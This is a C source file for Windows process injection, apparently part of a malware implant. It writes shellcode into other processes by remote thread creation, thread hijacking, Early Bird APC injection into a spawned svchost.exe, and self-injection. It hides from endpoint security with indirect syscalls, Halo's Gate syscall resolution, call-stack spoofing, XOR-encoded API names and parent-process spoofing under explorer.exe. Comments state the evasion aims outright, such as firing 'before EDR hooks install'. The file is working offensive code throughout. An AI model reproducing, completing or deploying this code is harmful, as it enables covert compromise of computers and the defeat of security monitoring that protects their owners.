#include "inject.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

typedef LONG NTSTATUS;

static DWORD _rt(HANDLE h)
{
    static DWORD(WINAPI * fn)(HANDLE) = NULL;
    if (!fn)
    {
        char fs[16], ks[16];
        EVS_D(fs, EVS_fn_ResumeThread);
        EVS_D(ks, EVS_dll_kernel32);
        HMODULE m = _peb_module(ks);
        SecureZeroMemory(ks, sizeof(ks));
        if (m)
            fn = (DWORD(WINAPI *)(HANDLE))GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    return fn ? fn(h) : (DWORD)-1;
}

/* ---- Spoof-call globals (accessed by name from spoof_stub.S) ---- */
void *inj_sc_gadget = NULL; /* syscall;ret in ntdll .text */
void *inj_frame1 = NULL;    /* kernelbase `ret` gadget    */
void *inj_frame2 = NULL;    /* ntdll `ret` gadget         */

/* Defined in spoof_stub.S — call-stack-spoofed indirect syscall dispatcher.
 * SSN + up to 11 args; unused trailing args must be 0.
 * All frames in .text (MEM_IMAGE) — no VirtualAlloc stub.                   */
extern NTSTATUS inj_sc(WORD ssn,
                       uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4,
                       uintptr_t a5, uintptr_t a6, uintptr_t a7, uintptr_t a8,
                       uintptr_t a9, uintptr_t a10, uintptr_t a11);

/* Nt* struct definitions (no winternl.h to avoid SDK conflicts) */
typedef struct
{
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} INJ_OA;

typedef struct
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} INJ_CID;

/* void* for struct pointer args — ABI-safe on x64 */
typedef NTSTATUS(NTAPI *NtOpenProcess_t)(
    PHANDLE hProcess,
    ACCESS_MASK access,
    void *oa,
    void *cid);

typedef NTSTATUS(NTAPI *NtAllocVm_t)(
    HANDLE hProcess,
    PVOID *base,
    ULONG_PTR zeroBits,
    PSIZE_T regionSize,
    ULONG allocType,
    ULONG protect);

typedef NTSTATUS(NTAPI *NtWriteVm_t)(
    HANDLE hProcess,
    PVOID base,
    PVOID buf,
    SIZE_T len,
    PSIZE_T written);

typedef NTSTATUS(NTAPI *NtProtectVm_t)(
    HANDLE hProcess,
    PVOID *base,
    PSIZE_T regionSize,
    ULONG newProtect,
    PULONG oldProtect);

typedef NTSTATUS(NTAPI *NtCreateThreadEx_t)(
    PHANDLE hThread,
    ACCESS_MASK access,
    void *oa,
    HANDLE hProcess,
    PVOID startRoutine,
    PVOID arg,
    ULONG flags,
    SIZE_T zeroBits,
    SIZE_T stackSize,
    SIZE_T maxStack,
    PVOID attrList);

typedef NTSTATUS(NTAPI *NtClose_t)(HANDLE h);

typedef NTSTATUS(NTAPI *NtQueueApcThread_t)(
    HANDLE hThread,
    PVOID ApcRoutine,
    PVOID ApcRoutineContext,
    PVOID ApcStatusBlock,
    PVOID ApcReserved);

/* module-stomp syscall types */

typedef NTSTATUS(NTAPI *NtCreateSection_t)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    void *ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtect,
    ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS(NTAPI *NtMapViewOfSection_t)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS(NTAPI *NtUnmapViewOfSection_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress);

/* thread-hijack syscall types */

typedef NTSTATUS(NTAPI *NtOpenThread_t)(
    PHANDLE hThread,
    ACCESS_MASK access,
    void *oa,
    void *cid);

typedef NTSTATUS(NTAPI *NtSuspendThread_t)(
    HANDLE hThread,
    PULONG PrevSuspendCount);

typedef NTSTATUS(NTAPI *NtResumeThread_t)(
    HANDLE hThread,
    PULONG PrevSuspendCount);

typedef NTSTATUS(NTAPI *NtGetCtx_t)(
    HANDLE hThread,
    PCONTEXT ctx);

typedef NTSTATUS(NTAPI *NtSetCtx_t)(
    HANDLE hThread,
    PCONTEXT ctx);

/* ---- ntdll handle (XOR-decoded, resolved once) ---- */

static HMODULE _ntdll(void)
{
    static HMODULE s_h = NULL;
    if (s_h)
        return s_h;
    char s[10] = {0};
    EVS_D(s, EVS_dll_ntdll);
    s_h = _peb_module(s);
    SecureZeroMemory(s, sizeof(s));
    return s_h;
}

/* ---- Indirect syscall gadget (syscall;ret inside ntdll .text) ---- */

static void *_syscall_gadget(void)
{
    static void *s_g = NULL;
    if (s_g)
        return s_g;

    HMODULE h = _ntdll();
    if (!h)
        return NULL;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)(void *)h;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)h + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        if (memcmp(sec->Name, ".text", 5) != 0)
            continue;
        BYTE *base = (BYTE *)h + sec->VirtualAddress;
        SIZE_T sz = sec->Misc.VirtualSize;
        for (SIZE_T j = 0; j + 2 < sz; j++)
        {
            /* syscall;ret opcode sequence */
            if (base[j] == 0x0F && base[j + 1] == 0x05 && base[j + 2] == 0xC3)
            {
                s_g = base + j;
                return s_g;
            }
        }
    }
    return NULL;
}

/* resolve syscall number (SSN) from ntdll EAT, with Halo's Gate fallback */
static WORD _ssn(const char *name)
{
    HMODULE ntdll = _ntdll();
    if (!ntdll)
        return 0xFFFF;

    BYTE *fn = (BYTE *)(void *)GetProcAddress(ntdll, name);
    if (!fn)
        return 0xFFFF;

    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8)
        return *(WORD *)(fn + 4);

    /* hooked: scan EAT for unhooked neighbor and adjust SSN by delta */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)(void *)ntdll;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)ntdll + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)((BYTE *)ntdll + nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD *names = (DWORD *)((BYTE *)ntdll + exp->AddressOfNames);
    DWORD *funcs = (DWORD *)((BYTE *)ntdll + exp->AddressOfFunctions);
    WORD *ords = (WORD *)((BYTE *)ntdll + exp->AddressOfNameOrdinals);

    int idx = -1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++)
    {
        if (strcmp((char *)((BYTE *)ntdll + names[i]), name) == 0)
        {
            idx = (int)i;
            break;
        }
    }
    if (idx < 0)
        return 0xFFFF;

    for (int d = 1; d <= 32; d++)
    {
        for (int s = -1; s <= 1; s += 2)
        {
            int ni = idx + s * d;
            if (ni < 0 || ni >= (int)exp->NumberOfNames)
                continue;
            BYTE *nb = (BYTE *)ntdll + funcs[ords[ni]];
            if (nb[0] == 0x4C && nb[1] == 0x8B && nb[2] == 0xD1 && nb[3] == 0xB8)
                return (WORD)(*(WORD *)(nb + 4) - (WORD)(s * d));
        }
    }
    return 0xFFFF;
}

/* Find first `ret` (0xC3) in module .text at or past min_off bytes into section */
static void *_find_ret_gadget(HMODULE h, SIZE_T min_off)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)(void *)h;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)h + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        if (memcmp(sec->Name, ".text", 5) != 0)
            continue;
        BYTE *base = (BYTE *)h + sec->VirtualAddress;
        SIZE_T sz = sec->Misc.VirtualSize;
        for (SIZE_T j = min_off; j < sz; j++)
            if (base[j] == 0xC3)
                return base + j;
    }
    return NULL;
}

static BOOL _init_spoof_frames(void)
{
    inj_sc_gadget = _syscall_gadget();
    if (!inj_sc_gadget)
        return FALSE;

    char kbn[16] = {0};
    EVS_D(kbn, EVS_dll_kernelbase);
    HMODULE hkb = _peb_module(kbn);
    SecureZeroMemory(kbn, sizeof(kbn));

    if (hkb)
        inj_frame1 = _find_ret_gadget(hkb, 0x2000);
    inj_frame2 = _find_ret_gadget(_ntdll(), 0x3000);
    return inj_frame1 && inj_frame2;
}

/* ---- Resolved syscall numbers — SSN_ prefix avoids SC_* Windows macro conflicts ---- */
enum
{
    SSN_OPEN = 0,
    SSN_ALLOC,
    SSN_WRITE,
    SSN_PROT,
    SSN_THREAD,
    SSN_CLOSE,
    SSN_OPENTHRD,
    SSN_SUSPEND,
    SSN_RESUME,
    SSN_GETCTX,
    SSN_SETCTX,
    SSN_APC,
    SSN_CRTSEC,
    SSN_MAPSEC,
    SSN_UNMAPSEC,
    SSN_COUNT
};
static WORD s_ssn[SSN_COUNT];
static BOOL s_ready = FALSE;
static BOOL s_hj_ready = FALSE;
static BOOL s_eb_ready = FALSE;
static BOOL s_stomp_ready = FALSE;

static BOOL _init(void)
{
    if (s_ready)
        return TRUE;
    if (!inj_sc_gadget && !_init_spoof_frames())
        return FALSE;

    struct
    {
        const unsigned char *e;
        size_t n;
        int idx;
    } t[] = {
        {EVS_fn_NtOpenProcess, sizeof(EVS_fn_NtOpenProcess), SSN_OPEN},
        {EVS_fn_NtAllocateVirtualMemory, sizeof(EVS_fn_NtAllocateVirtualMemory), SSN_ALLOC},
        {EVS_fn_NtWriteVirtualMemory, sizeof(EVS_fn_NtWriteVirtualMemory), SSN_WRITE},
        {EVS_fn_NtProtectVirtualMemory, sizeof(EVS_fn_NtProtectVirtualMemory), SSN_PROT},
        {EVS_fn_NtCreateThreadEx, sizeof(EVS_fn_NtCreateThreadEx), SSN_THREAD},
        {EVS_fn_NtClose, sizeof(EVS_fn_NtClose), SSN_CLOSE},
    };

    char _n[32];
    for (int i = 0; i < 6; i++)
    {
        _evs_dec(_n, t[i].e, t[i].n);
        s_ssn[t[i].idx] = _ssn(_n);
        SecureZeroMemory(_n, t[i].n + 1);
        if (s_ssn[t[i].idx] == 0xFFFF)
            return FALSE;
    }
    s_ready = TRUE;
    return TRUE;
}

static BOOL _init_hijack(void)
{
    if (s_hj_ready)
        return TRUE;
    if (!inj_sc_gadget && !_init_spoof_frames())
        return FALSE;

    struct
    {
        const unsigned char *e;
        size_t n;
        int idx;
    } t[] = {
        {EVS_fn_NtOpenThread, sizeof(EVS_fn_NtOpenThread), SSN_OPENTHRD},
        {EVS_fn_NtSuspendThread, sizeof(EVS_fn_NtSuspendThread), SSN_SUSPEND},
        {EVS_fn_NtResumeThread, sizeof(EVS_fn_NtResumeThread), SSN_RESUME},
        {EVS_fn_NtGetContextThread, sizeof(EVS_fn_NtGetContextThread), SSN_GETCTX},
        {EVS_fn_NtSetContextThread, sizeof(EVS_fn_NtSetContextThread), SSN_SETCTX},
    };

    char _n[24];
    for (int i = 0; i < 5; i++)
    {
        _evs_dec(_n, t[i].e, t[i].n);
        s_ssn[t[i].idx] = _ssn(_n);
        SecureZeroMemory(_n, t[i].n + 1);
        if (s_ssn[t[i].idx] == 0xFFFF)
            return FALSE;
    }
    s_hj_ready = TRUE;
    return TRUE;
}

static BOOL _init_earlybird(void)
{
    if (s_eb_ready)
        return TRUE;
    if (!inj_sc_gadget && !_init_spoof_frames())
        return FALSE;
    char _n[18];
    EVS_D(_n, EVS_fn_NtQueueApcThread);
    s_ssn[SSN_APC] = _ssn(_n);
    SecureZeroMemory(_n, sizeof(_n));
    if (s_ssn[SSN_APC] == 0xFFFF)
        return FALSE;
    s_eb_ready = TRUE;
    return TRUE;
}

static BOOL _init_stomp(void)
{
    if (s_stomp_ready)
        return TRUE;
    if (!_init())
        return FALSE;
        

    struct
    {
        const unsigned char *e;
        size_t n;
        int idx;
    } t[] = {
        {EVS_fn_NtCreateSection, sizeof(EVS_fn_NtCreateSection), SSN_CRTSEC},
        {EVS_fn_NtMapViewOfSection, sizeof(EVS_fn_NtMapViewOfSection), SSN_MAPSEC},
        {EVS_fn_NtUnmapViewOfSection, sizeof(EVS_fn_NtUnmapViewOfSection), SSN_UNMAPSEC},
    };

    char _n[24];
    for (int i = 0; i < 3; i++)
    {
        _evs_dec(_n, t[i].e, t[i].n);
        s_ssn[t[i].idx] = _ssn(_n);
        SecureZeroMemory(_n, t[i].n + 1);
        if (s_ssn[t[i].idx] == 0xFFFF)
            return FALSE;
    }
    s_stomp_ready = TRUE;
    return TRUE;
}

/* open a process handle via indirect NtOpenProcess — no Win32 OpenProcess in IAT */
HANDLE inject_nt_open_process(DWORD pid, DWORD access)
{
    if (!_init())
        return NULL;

    HANDLE hproc = NULL;
    INJ_OA oa = {sizeof(oa), NULL, NULL, 0, NULL, NULL};
    INJ_CID cid = {(HANDLE)(uintptr_t)pid, NULL};
    NTSTATUS st = inj_sc(s_ssn[SSN_OPEN],
                         (uintptr_t)&hproc, (uintptr_t)access, (uintptr_t)&oa, (uintptr_t)&cid,
                         0, 0, 0, 0, 0, 0, 0);
    return st ? NULL : hproc;
}

/* find explorer.exe PID for PPID spoof */
static DWORD _find_explorer(void)
{
    char _en[13];
    EVS_D(_en, EVS_str_explorer_exe);

    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
    {
        SecureZeroMemory(_en, sizeof(_en));
        return 0;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe))
        do
        {
            if (_stricmp(pe.szExeFile, _en) == 0)
            {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    SecureZeroMemory(_en, sizeof(_en));
    return pid;
}

/* find a suitable injection target process */

DWORD inject_find_target(void)
{
    char n0[20], n1[14], n2[14];
    EVS_D(n0, EVS_str_RuntimeBroker_exe);
    EVS_D(n1, EVS_str_dllhost_exe);
    EVS_D(n2, EVS_str_explorer_exe);

    const char *prefs[4] = {n0, n1, n2, NULL};
    DWORD results[3] = {0};

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        goto cleanup;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe))
    {
        do
        {
            for (int i = 0; prefs[i]; i++)
                if (!results[i] && _stricmp(pe.szExeFile, prefs[i]) == 0)
                    results[i] = pe.th32ProcessID;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

cleanup:
    SecureZeroMemory(n0, sizeof(n0));
    SecureZeroMemory(n1, sizeof(n1));
    SecureZeroMemory(n2, sizeof(n2));
    for (int i = 0; i < 3; i++)
        if (results[i])
            return results[i];
    return 0;
}

/* inject shellcode into remote process via indirect Nt* syscalls */
int inject_remote(DWORD pid, const BYTE *sc, SIZE_T sc_len)
{
    if (!sc || !sc_len || !_init())
        return -1;

    HANDLE hproc = NULL;
    PVOID base = NULL;
    SIZE_T sz = sc_len;

    INJ_OA oa = {sizeof(oa), NULL, NULL, 0, NULL, NULL};
    INJ_CID cid = {(HANDLE)(uintptr_t)pid, NULL};

    NTSTATUS st = inj_sc(s_ssn[SSN_OPEN],
                         (uintptr_t)&hproc, PROCESS_ALL_ACCESS, (uintptr_t)&oa, (uintptr_t)&cid,
                         0, 0, 0, 0, 0, 0, 0);
    if (st)
        return -2;

    /* alloc RW, never RWX */
    st = inj_sc(s_ssn[SSN_ALLOC],
                (uintptr_t)hproc, (uintptr_t)&base, 0, (uintptr_t)&sz,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -3;
    }

    SIZE_T nwritten = 0;
    st = inj_sc(s_ssn[SSN_WRITE],
                (uintptr_t)hproc, (uintptr_t)base, (uintptr_t)sc, (uintptr_t)sc_len,
                (uintptr_t)&nwritten, 0, 0, 0, 0, 0, 0);
    if (st || nwritten != sc_len)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -4;
    }

    /* flip RW -> RX, no RWX window */
    ULONG old_prot;
    sz = sc_len;
    st = inj_sc(s_ssn[SSN_PROT],
                (uintptr_t)hproc, (uintptr_t)&base, (uintptr_t)&sz,
                PAGE_EXECUTE_READ, (uintptr_t)&old_prot, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -5;
    }

    HANDLE hthread = NULL;
    st = inj_sc(s_ssn[SSN_THREAD],
                (uintptr_t)&hthread, THREAD_ALL_ACCESS, 0, (uintptr_t)hproc,
                (uintptr_t)base, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -6;
    }

    CloseHandle(hthread);
    inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    return 0;
}

/* hijack an existing thread in target process instead of creating a new one */
int inject_thread_hijack(DWORD pid, const BYTE *sc, SIZE_T sc_len)
{
    if (!sc || !sc_len)
        return -1;
    if (!_init() || !_init_hijack())
        return -1;

    /* open target for VM ops only, no thread-create rights */
    HANDLE hproc = NULL;
    PVOID base = NULL;
    SIZE_T sz = sc_len;

    INJ_OA oa = {sizeof(oa), NULL, NULL, 0, NULL, NULL};
    INJ_CID cid = {(HANDLE)(uintptr_t)pid, NULL};

    NTSTATUS st = inj_sc(s_ssn[SSN_OPEN],
                         (uintptr_t)&hproc,
                         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                         (uintptr_t)&oa, (uintptr_t)&cid, 0, 0, 0, 0, 0, 0, 0);
    if (st)
        return -2;

    /* alloc RW, write, flip RX */
    st = inj_sc(s_ssn[SSN_ALLOC],
                (uintptr_t)hproc, (uintptr_t)&base, 0, (uintptr_t)&sz,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -3;
    }

    SIZE_T nw = 0;
    st = inj_sc(s_ssn[SSN_WRITE],
                (uintptr_t)hproc, (uintptr_t)base, (uintptr_t)sc, (uintptr_t)sc_len,
                (uintptr_t)&nw, 0, 0, 0, 0, 0, 0);
    if (st || nw != sc_len)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -4;
    }

    ULONG old_prot;
    sz = sc_len;
    st = inj_sc(s_ssn[SSN_PROT],
                (uintptr_t)hproc, (uintptr_t)&base, (uintptr_t)&sz,
                PAGE_EXECUTE_READ, (uintptr_t)&old_prot, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -5;
    }

    /* Enumerate threads — collect up to 64 TIDs belonging to pid */
    DWORD tids[64];
    int ntids = 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap != INVALID_HANDLE_VALUE)
    {
        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        if (Thread32First(snap, &te))
        {
            do
            {
                if (te.th32OwnerProcessID == pid && ntids < 64)
                    tids[ntids++] = te.th32ThreadID;
            } while (Thread32Next(snap, &te));
        }
        CloseHandle(snap);
    }

    if (!ntids)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -6;
    }

    /* prefer secondary thread (index 1) over main thread (index 0) */
    DWORD target_tid = (ntids > 1) ? tids[1] : tids[0];

    /* open thread via syscall */
    HANDLE hthread = NULL;
    INJ_CID tcid = {(HANDLE)(uintptr_t)pid, (HANDLE)(uintptr_t)target_tid};
    st = inj_sc(s_ssn[SSN_OPENTHRD],
                (uintptr_t)&hthread,
                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                (uintptr_t)&oa, (uintptr_t)&tcid, 0, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -7;
    }

    /* suspend, redirect RIP, resume */
    ULONG prev = 0;
    st = inj_sc(s_ssn[SSN_SUSPEND], (uintptr_t)hthread, (uintptr_t)&prev,
                0, 0, 0, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hthread, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -8;
    }

    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    st = inj_sc(s_ssn[SSN_GETCTX], (uintptr_t)hthread, (uintptr_t)&ctx,
                0, 0, 0, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        inj_sc(s_ssn[SSN_RESUME], (uintptr_t)hthread, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hthread, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        return -9;
    }

#ifdef _WIN64
    ctx.Rip = (DWORD64)(uintptr_t)base;
#else
    ctx.Eip = (DWORD)(uintptr_t)base;
#endif

    st = inj_sc(s_ssn[SSN_SETCTX], (uintptr_t)hthread, (uintptr_t)&ctx,
                0, 0, 0, 0, 0, 0, 0, 0, 0);
    inj_sc(s_ssn[SSN_RESUME], (uintptr_t)hthread, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);

    inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hthread, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    inj_sc(s_ssn[SSN_CLOSE], (uintptr_t)hproc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    return st ? -10 : 0;
}

/* spawn suspended process, queue shellcode as APC, resume */
int inject_earlybird(const BYTE *sc, SIZE_T sc_len)
{
    if (!sc || !sc_len)
        return -1;
    if (!_init() || !_init_earlybird())
        return -1;

    char svc_name[16] = {0};
    EVS_D(svc_name, EVS_str_svchost_exe);

    /* Build full path: C:\Windows\System32\svchost.exe */
    char sys32[MAX_PATH];
    if (!GetSystemDirectoryA(sys32, sizeof(sys32)))
        return -2;
    char target[512]; /* 512 > MAX_PATH + 1 + 11 (svchost.exe) — no truncation */
    snprintf(target, sizeof(target), "%s\\%s", sys32, svc_name);
    SecureZeroMemory(svc_name, sizeof(svc_name));

    /* PPID spoof: appear to be a child of explorer.exe, not the agent */
    typedef BOOL(WINAPI * InitPTA_t)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
    typedef BOOL(WINAPI * UpdatePTA_t)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
    typedef void(WINAPI * DelPTA_t)(LPPROC_THREAD_ATTRIBUTE_LIST);

    char _ipta[34], _upta[26], _dpta[30];
    HMODULE hk32;
    {
        EVS_D(_ipta, EVS_fn_InitializeProcThreadAttributeList);
        EVS_D(_upta, EVS_fn_UpdateProcThreadAttribute);
        EVS_D(_dpta, EVS_fn_DeleteProcThreadAttributeList);
        char _ks[14];
        EVS_D(_ks, EVS_dll_kernel32);
        hk32 = _peb_module(_ks);
        SecureZeroMemory(_ks, sizeof(_ks));
    }
    InitPTA_t fn_init = hk32 ? (InitPTA_t)GetProcAddress(hk32, _ipta) : NULL;
    UpdatePTA_t fn_upd = hk32 ? (UpdatePTA_t)GetProcAddress(hk32, _upta) : NULL;
    DelPTA_t fn_del = hk32 ? (DelPTA_t)GetProcAddress(hk32, _dpta) : NULL;

    HANDLE hParent = NULL;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;
    SIZE_T attrListSz = 0;

    BOOL ppid_ok = FALSE;
    if (fn_init && fn_upd && fn_del)
    {
        DWORD explorer_pid = _find_explorer();
        if (explorer_pid)
        {
            hParent = inject_nt_open_process(explorer_pid,
                                             0x0080 /* PROCESS_CREATE_PROCESS */);
        }
        if (hParent)
        {
            fn_init(NULL, 1, 0, &attrListSz);
            pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
                GetProcessHeap(), 0, attrListSz);
            if (pAttrList && fn_init(pAttrList, 1, 0, &attrListSz))
            {
                /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000 */
                if (fn_upd(pAttrList, 0, 0x00020000,
                           &hParent, sizeof(HANDLE), NULL, NULL))
                    ppid_ok = TRUE;
            }
        }
    }

    STARTUPINFOEXA siex = {0};
    PROCESS_INFORMATION pi = {0};
    siex.StartupInfo.cb = sizeof(siex);
    DWORD cflags = CREATE_SUSPENDED | CREATE_NO_WINDOW;

    if (ppid_ok)
    {
        siex.lpAttributeList = pAttrList;
        cflags |= EXTENDED_STARTUPINFO_PRESENT;
    }

    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        cflags, NULL, NULL,
                        (LPSTARTUPINFOA)&siex, &pi))
    {
        if (pAttrList)
        {
            fn_del(pAttrList);
            HeapFree(GetProcessHeap(), 0, pAttrList);
        }
        if (hParent)
            CloseHandle(hParent);
        return -2;
    }

    if (pAttrList)
    {
        fn_del(pAttrList);
        HeapFree(GetProcessHeap(), 0, pAttrList);
    }
    if (hParent)
        CloseHandle(hParent);

    /* Allocate RW shellcode region in remote process */
    HANDLE hproc = pi.hProcess;
    PVOID base = NULL;
    SIZE_T sz = sc_len;

    NTSTATUS st = inj_sc(s_ssn[SSN_ALLOC],
                         (uintptr_t)hproc, (uintptr_t)&base, 0, (uintptr_t)&sz,
                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0, 0, 0, 0, 0);
    if (st)
    {
        TerminateProcess(hproc, 0);
        CloseHandle(pi.hThread);
        CloseHandle(hproc);
        return -3;
    }

    /* Write shellcode */
    SIZE_T nw = 0;
    st = inj_sc(s_ssn[SSN_WRITE],
                (uintptr_t)hproc, (uintptr_t)base, (uintptr_t)sc, (uintptr_t)sc_len,
                (uintptr_t)&nw, 0, 0, 0, 0, 0, 0);
    if (st || nw != sc_len)
    {
        TerminateProcess(hproc, 0);
        CloseHandle(pi.hThread);
        CloseHandle(hproc);
        return -4;
    }

    /* Flip RW → RX — no RWX window */
    ULONG old_prot;
    sz = sc_len;
    st = inj_sc(s_ssn[SSN_PROT],
                (uintptr_t)hproc, (uintptr_t)&base, (uintptr_t)&sz,
                PAGE_EXECUTE_READ, (uintptr_t)&old_prot, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        TerminateProcess(hproc, 0);
        CloseHandle(pi.hThread);
        CloseHandle(hproc);
        return -5;
    }

    /* Queue APC targeting the main thread (currently suspended) */
    st = inj_sc(s_ssn[SSN_APC],
                (uintptr_t)pi.hThread, (uintptr_t)base, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    if (st)
    {
        TerminateProcess(hproc, 0);
        CloseHandle(pi.hThread);
        CloseHandle(hproc);
        return -6;
    }

    /* resume — APC fires during ntdll init before EDR hooks install */
    _rt(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(hproc);
    return 0;
}

/* inject shellcode into current process */
int inject_self(const BYTE *sc, SIZE_T sc_len)
{
    if (!sc || !sc_len || !_init())
        return -1;

    HANDLE self = (HANDLE)(LONG_PTR)-1; /* NtCurrentProcess */
    PVOID base = NULL;
    SIZE_T sz = sc_len;

    /* alloc RW, no RWX */
    NTSTATUS st = inj_sc(s_ssn[SSN_ALLOC],
                         (uintptr_t)self, (uintptr_t)&base, 0, (uintptr_t)&sz,
                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0, 0, 0, 0, 0);
    if (st)
        return -3;

    /* write directly, same address space */
    memcpy(base, sc, sc_len);

    /* RW → RX */
    ULONG old_prot;
    sz = sc_len;
    st = inj_sc(s_ssn[SSN_PROT],
                (uintptr_t)self, (uintptr_t)&base, (uintptr_t)&sz,
                PAGE_EXECUTE_READ, (uintptr_t)&old_prot, 0, 0, 0, 0, 0, 0);
    if (st)
        return -5;

    /* Thread in current process */
    HANDLE hthread = NULL;
    st = inj_sc(s_ssn[SSN_THREAD],
                (uintptr_t)&hthread, THREAD_ALL_ACCESS, 0, (uintptr_t)self,
                (uintptr_t)base, 0, 0, 0, 0, 0, 0);
    if (st)
        return -6;

    CloseHandle(hthread);
    return 0;
}

